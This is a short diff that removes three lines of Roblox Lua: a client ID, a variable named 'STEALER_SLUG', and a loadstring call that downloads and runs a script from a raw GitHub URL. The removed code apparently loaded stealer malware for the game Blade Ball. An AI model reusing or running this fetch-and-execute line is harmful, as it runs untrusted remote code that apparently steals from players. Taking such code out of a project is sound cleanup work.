@@ -1,3 +1,0 @@
-CLIENT_ID = "be6780290a934120"
-STEALER_SLUG = "bladeball"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x-scripts/refs/heads/main/bladeball.lua"))()
